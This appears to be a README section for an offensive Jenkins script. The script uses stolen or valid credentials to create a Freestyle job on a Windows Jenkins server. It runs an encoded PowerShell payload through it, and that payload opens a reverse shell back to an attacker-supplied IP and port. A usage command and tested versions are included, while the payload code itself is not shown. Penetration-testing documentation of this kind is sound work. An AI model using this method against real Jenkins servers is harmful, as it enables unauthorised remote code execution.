## win_revshell_cmd.py
This script is useful when you have valid credentials and want to check if it can be use to spawn a reverse shell.\
The Jenkins server must be installed on Windows.\
To be able to receive a reverse shell, the user must have BUILD and JOB CREATION privileges.\
Once logged in on Jenkins, the script creates a new "Freestyle project" JOB.\
![win_revshell_cmd_1](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_cmd.py/images/win_revshell_cmd_1.png)

Then configures or BUILD it to **"Execute Windows batch command"** with the **Powershell** encoded payload.
![win_revshell_cmd_2](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_cmd.py/images/win_revshell_cmd_2.png)

Finally, the script sends the instruction to execute this JOB.

USAGE:\
python3 ./win_revshell_cmd.py -w URL -r LOCAL_IP -rp LOCAL_PORT
![win_revshell_cmd_3](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_cmd.py/images/win_revshell_cmd_3.png)
![win_revshell_cmd_4](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_cmd.py/images/win_revshell_cmd_4.png)

Tested on Jenkins 2.150.2 and Windows 10 Pro 22H2 b.19045
